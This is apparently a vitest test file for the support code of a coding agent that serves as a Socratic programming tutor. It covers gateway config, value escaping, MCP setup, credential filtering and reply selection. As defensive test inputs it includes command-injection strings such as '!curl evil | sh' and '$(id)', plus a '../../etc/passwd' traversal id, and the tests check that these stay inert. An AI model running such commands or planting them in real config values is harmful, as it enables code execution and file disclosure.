import fs from 'fs';
import os from 'os';
import path from 'path';
import { pathToFileURL } from 'url';
import { describe, expect, it } from 'vitest';

import { bashEnv, chooseReply, escapeConfigValue, findSessionFile, llmConfig, mcpEntries, stripEchoedHumanTurn, summarizeRun } from '../src/pi-support.js';

describe('llmConfig', () => {
  const gateway = { ANTHROPIC_BASE_URL: 'http://tai-litellm:4000', ANTHROPIC_AUTH_TOKEN: 'sk-gw', ANTHROPIC_DEFAULT_SONNET_MODEL: 'qwen' };

  it('follows the gateway the runner already has, over the OpenAI API', () => {
    expect(llmConfig(gateway)).toEqual({
      api: 'openai-completions',
      baseUrl: 'http://tai-litellm:4000/v1',
      apiKey: 'sk-gw',
      modelId: 'qwen',
      contextWindow: 131072,
      maxTokens: 8192,
    });
    expect(llmConfig({ ...gateway, ANTHROPIC_BASE_URL: 'http://tai-litellm:4000/' }).baseUrl).toBe('http://tai-litellm:4000/v1');
  });

  it('TAI_LLM_* override it', () => {
    const c = llmConfig({ ...gateway, TAI_LLM_BASE_URL: 'https://api.cerebras.ai/v1', TAI_LLM_API_KEY: 'k', TAI_LLM_MODEL: 'gpt-oss-120b', TAI_LLM_CONTEXT_WINDOW: '65536', TAI_LLM_MAX_TOKENS: '4096' });
    expect(c).toMatchObject({ baseUrl: 'https://api.cerebras.ai/v1', apiKey: 'k', modelId: 'gpt-oss-120b', contextWindow: 65536, maxTokens: 4096 });
  });

  it('the scripted model of the evaluation speaks the Anthropic API at the server root', () => {
    const c = llmConfig({ ...gateway, ANTHROPIC_BASE_URL: 'http://tai-mockllm:8000', ANTHROPIC_DEFAULT_SONNET_MODEL: 'mock', TAI_LLM_API: 'anthropic-messages' });
    expect(c).toMatchObject({ api: 'anthropic-messages', baseUrl: 'http://tai-mockllm:8000', modelId: 'mock' });
  });

  it('falls back to the other Claude Code variables', () => {
    expect(llmConfig({ ANTHROPIC_BASE_URL: 'http://x', ANTHROPIC_API_KEY: 'k2', ANTHROPIC_MODEL: 'm2' })).toMatchObject({ apiKey: 'k2', modelId: 'm2' });
    expect(llmConfig({}).modelId).toBe('qwen');
  });
});

describe('escapeConfigValue: a value reaches the server as it is', () => {
  const nasty = ['plain', 'ghp_abc$def', '$HOME', '${PATH}', '$$', '$!x', '!echo pwned', '!', 'a!b', 'x$', '${', '${NOT A NAME}', '', 'pa$$word!', '$(id)', '`id`'];

  it('doubles the dollars and protects a leading bang', () => {
    expect(escapeConfigValue('a$b')).toBe('a$$b');
    expect(escapeConfigValue('!cmd')).toBe('$!cmd');
    expect(escapeConfigValue('plain')).toBe('plain');
  });

  // pi's own reader of such values, imported by path because the package does not export it
  it('round-trips through pi\'s resolver, which would otherwise expand $VAR and run !commands', async () => {
    const file = path.resolve('node_modules/@earendil-works/pi-coding-agent/dist/core/resolve-config-value.js');
    if (!fs.existsSync(file)) return; // pi is not installed where the tests run
    const { resolveConfigValue } = (await import(pathToFileURL(file).href)) as { resolveConfigValue: (c: string, env?: Record<string, string>) => string | undefined };
    for (const value of nasty) {
      expect(resolveConfigValue(escapeConfigValue(value), { HOME: '/leaked', PATH: '/leaked' }), JSON.stringify(value)).toBe(value);
    }
  });
});

describe('mcpEntries', () => {
  it('declares the tools directly and escapes what is handed over', () => {
    const entries = mcpEntries({ nanoclaw: { command: 'node', args: ['/app/dist/ipc-mcp-stdio.js'], env: { NANOCLAW_GITHUB_USERNAME: '!curl evil | sh', GITHUB_TOKEN: 'ghp_$x' } } });
    expect(entries).toHaveLength(1);
    expect(entries[0].name).toBe('nanoclaw');
    expect(entries[0].config).toMatchObject({ type: 'stdio', command: 'node', args: ['/app/dist/ipc-mcp-stdio.js'], exposure: 'direct' });
    expect(entries[0].config.env).toEqual({ NANOCLAW_GITHUB_USERNAME: '$!curl evil | sh', GITHUB_TOKEN: 'ghp_$$x' });
    expect(entries[0]).toMatchObject({ scope: 'extension' });
  });
});

describe('bashEnv', () => {
  it('leaves out anything named like a credential', () => {
    const env = bashEnv({ PATH: '/usr/bin', HOME: '/home/node', TZ: 'UTC', GITHUB_TOKEN: 'x', CANVAS_API_TOKEN: 'y', MY_PASSWORD: 'z', AWS_SECRET_ACCESS_KEY: 'w', YOUTUBE_API_KEY: 'v', UNSET: undefined });
    expect(env).toEqual({ PATH: '/usr/bin', HOME: '/home/node', TZ: 'UTC' });
  });
});

describe('findSessionFile', () => {
  it('finds the file pi named for the session, and nothing for an id that is not ours', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pi-sessions-'));
    try {
      fs.writeFileSync(path.join(dir, '2026-11-01T22-45-10-123Z_0199aaaa-bbbb-cccc-dddd-eeeeffff0001.jsonl'), '');
      fs.writeFileSync(path.join(dir, '2026-11-01T22-50-00-000Z_0199aaaa-bbbb-cccc-dddd-eeeeffff0002.jsonl'), '');
      expect(findSessionFile(dir, '0199aaaa-bbbb-cccc-dddd-eeeeffff0002')).toBe(path.join(dir, '2026-11-01T22-50-00-000Z_0199aaaa-bbbb-cccc-dddd-eeeeffff0002.jsonl'));
      expect(findSessionFile(dir, 'a3b2c1d0-0000-0000-0000-000000000000')).toBeUndefined(); // a Claude Code session id
      expect(findSessionFile(dir, undefined)).toBeUndefined();
      expect(findSessionFile(dir, '../../etc/passwd')).toBeUndefined();
      expect(findSessionFile(path.join(dir, 'missing'), '0199aaaa-bbbb-cccc-dddd-eeeeffff0001')).toBeUndefined();
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('summarizeRun', () => {
  const user = { role: 'user', content: [{ type: 'text', text: 'hi' }] };
  const assistant = (extra: Record<string, unknown>) => ({ role: 'assistant', content: [{ type: 'text', text: 'hello there' }], stopReason: 'stop', usage: { input: 1000, output: 20, cacheRead: 9000, cacheWrite: 0 }, ...extra });

  it('the answer is the text of the last assistant message, the context its prompt', () => {
    const run = summarizeRun([user, assistant({ stopReason: 'toolUse', content: [{ type: 'toolCall', id: '1', name: 'read', arguments: {} }], usage: { input: 500, output: 10, cacheRead: 4000, cacheWrite: 0 } }), { role: 'toolResult' }, assistant({})]);
    expect(run.text).toBe('hello there');
    expect(run.failure).toBeNull();
    expect(run.contextTokens).toBe(10_000);
    expect(run.calls).toHaveLength(2);
  });

  it('joins the text blocks and ignores thinking and tool calls', () => {
    const run = summarizeRun([assistant({ content: [{ type: 'thinking', thinking: 'hmm' }, { type: 'text', text: 'one ' }, { type: 'toolCall', name: 'x' }, { type: 'text', text: 'two' }] })]);
    expect(run.text).toBe('one two');
  });

  it('a failed request has no answer and a failure', () => {
    const run = summarizeRun([user, assistant({ stopReason: 'error', errorMessage: '429 {"message":"Tokens per minute limit exceeded - too many tokens processed."}', content: [], usage: undefined })]);
    expect(run.text).toBeNull();
    expect(run.failure).toEqual({ kind: 'busy', status: 429 });
    expect(run.contextTokens).toBeNull();
  });

  it('a reply written before the tool calls of its turn still reaches the student when the last message only points back to it', () => {
    const reply = 'hey, i can not write that for you, but i can walk you through the pieces so that you can write it yourself. where do you want to start?';
    const run = summarizeRun([
      user,
      assistant({ stopReason: 'toolUse', content: [{ type: 'text', text: reply }, { type: 'toolCall', id: '1', name: 'edit', arguments: {} }] }),
      { role: 'toolResult' },
      assistant({ content: [{ type: 'text', text: '*(response already sent above)*' }] }),
    ]);
    expect(run.text).toBe(reply);
    expect(run.sentViaTool).toBe(false);
  });

  it('notes that the model spoke to the student through send_message', () => {
    const run = summarizeRun([
      user,
      assistant({ stopReason: 'toolUse', content: [{ type: 'toolCall', id: '1', name: 'mcp__nanoclaw__send_message', arguments: { text: 'hi' } }] }),
      { role: 'toolResult' },
      assistant({ content: [{ type: 'text', text: '' }] }),
    ]);
    expect(run.text).toBeNull();
    expect(run.sentViaTool).toBe(true);
  });

  it('an empty reply is null, an aborted one is not an answer', () => {
    expect(summarizeRun([assistant({ content: [{ type: 'text', text: '   ' }] })]).text).toBeNull();
    expect(summarizeRun([assistant({ stopReason: 'aborted' })]).text).toBeNull();
    expect(summarizeRun([]).text).toBeNull();
  });
});

describe('chooseReply: the reply the student gets', () => {
  const real = 'hey, i can not write the worker pool for you to paste in, but i can walk you through the pieces until you can write it yourself. so what do you know about channels?';

  it('is the text of the last message', () => {
    expect(chooseReply(['', 'Looking into it now.', 'so what do you think happens when nobody reads the results channel?'])).toBe('so what do you think happens when nobody reads the results channel?');
    expect(chooseReply(['only one'])).toBe('only one');
    expect(chooseReply([])).toBeNull();
  });

  it('is NOT everything the model said in the turn: narration next to tool calls stays out (measured, s2 of pi4: 1,396 words of working notes)', () => {
    const narration = [
      "The student is asking about Raft's split vote handling. Let me check their competency first.",
      "The student's asking about Raft split votes. Let me check their competency level for Raft. Raft (leader election, log replication): 0.2 | 0.1 so they have LOW confidence.",
      'Now let me check the strategy log and interaction summary:',
      'The strategy log is empty, no prior interactions recorded for this student. This is a first interaction. Let me check the interaction summary.',
      'Now let me write my response to the student.',
    ];
    const reply = 'ah split votes — one of the sneaky parts of raft elections. before i jump into the fix, quick check: how does a node actually win an election?';
    expect(chooseReply([...narration, reply])).toBe(reply);
  });

  it('falls back to the reply a model wrote before its bookkeeping when the last message is only a note (measured: qwen, s7)', () => {
    expect(chooseReply([real, '', '*(response already sent above — redirect to Socratic teaching on worker pool channels)*'])).toBe(real);
    expect(chooseReply(['Looking into it now.', real, '(done)'])).toBe(real);
  });

  it('falls back when the last message is empty or only reasoning', () => {
    expect(chooseReply([real, ''])).toBe(real);
    expect(chooseReply([real, '<internal>log it</internal>'])).toBe(real);
  });

  it('recognises the notes qwen wrote in place of an answer (measured)', () => {
    for (const note of ['*response already sent above*', '...', '…', '*', '<i>(silently ignored with no reply)</i>', '(response sent above)', '*(Answered above.)*']) {
      expect(chooseReply([real, note]), note).toBe(real);
      expect(chooseReply([note]), note).toBeNull();
    }
  });

  it('but not a real sentence that happens to use the words', () => {
    for (const reply of [
      'good question, the answer is a single word: no',
      'i sent you the link above, so take a look and tell me which part of the proof is unclear to you now',
      'your reply earlier was right about the first case, so what changes in the second one?',
    ]) {
      expect(chooseReply([real, reply]), reply).toBe(reply);
    }
  });

  it('skips narration when it falls back, and gives nothing when there is nothing else', () => {
    expect(chooseReply(['Looking into it now — one sec.', ''])).toBeNull();
    expect(chooseReply(['(thinking)', '(done)'])).toBeNull();
    expect(chooseReply([''])).toBeNull();
  });

  it('a parenthetical inside a real reply is not a note', () => {
    const reply = 'good question (and a common one) — what would happen to the other workers if one of them blocked forever on that send?';
    expect(chooseReply([real, reply])).toBe(reply);
    const two = 'first part' + String.fromCharCode(10, 10) + '(second part, in parentheses)';
    expect(chooseReply([real, two])).toBe(two);
  });
});

describe('stripEchoedHumanTurn', () => {
  it('drops an echoed message block and what follows it', () => {
    expect(stripEchoedHumanTurn('sure thing\n\nHuman: <messages><message>x</message></messages>')).toBe('sure thing');
    expect(stripEchoedHumanTurn('Human: <messages>only this</messages>')).toBeNull();
    expect(stripEchoedHumanTurn('a plain answer')).toBe('a plain answer');
    expect(stripEchoedHumanTurn(null)).toBeNull();
  });
});
